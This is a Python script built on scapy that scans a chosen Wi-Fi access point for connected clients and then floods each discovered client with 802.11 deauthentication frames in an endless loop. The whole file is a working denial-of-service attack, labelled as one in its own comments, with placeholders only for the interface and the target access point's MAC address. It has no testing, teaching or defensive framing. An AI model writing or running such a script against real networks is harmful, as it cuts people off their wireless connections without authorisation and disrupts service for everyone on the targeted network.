from scapy.all import *
import time
import threading

# Configure interface
iface = "wlan0mon"  # Ensure your adapter is in monitor mode

# Target AP's MAC address
ap_mac = "YY:YY:YY:YY:YY:YY"  # Change this to your target AP's MAC address
client_list = set()  # To store discovered clients

# Function to discover clients by scanning for packets
def network_scan():
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.addr2 == ap_mac and pkt.addr1 != "ff:ff:ff:ff:ff:ff":  # Probe response from AP
                client_mac = pkt.addr1
                if client_mac not in client_list:
                    client_list.add(client_mac)
                    print(f"Discovered client: {client_mac}")

    print("Scanning for clients...")
    sniff(iface=iface, prn=packet_handler, timeout=15)  # Adjust timeout as needed
    print("Scan complete. Found clients:", client_list)

# Function to send deauth packets to a target
def send_deauth(target, ap):
    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=10000, inter=0.1, verbose=False)
    print(f"Sent deauth to {target} via AP {ap}")

# Function to continuously scan for clients
def scan_continuously():
    while True:
        network_scan()
        time.sleep(5)  # Wait 5 seconds before scanning again

# Main attack function to scan then attack
def main():
    # Step 1: Start continuous scanning for clients in a separate thread
    scan_thread = threading.Thread(target=scan_continuously)
    scan_thread.daemon = True  # This will allow the thread to exit when the program ends
    scan_thread.start()

    # Step 2: Deauth attack on each discovered client
    try:
        while True:
            if client_list:
                print("Starting deauth attack on discovered clients...")
                for client in client_list:
                    send_deauth(client, ap_mac)
                    time.sleep(0.5)  # Small delay between attacks
            else:
                print("No clients found.")
                time.sleep(5)  # Wait before trying again
    except KeyboardInterrupt:
        print("Attack stopped by user.")

# Run the main function
if __name__ == "__main__":
    main()
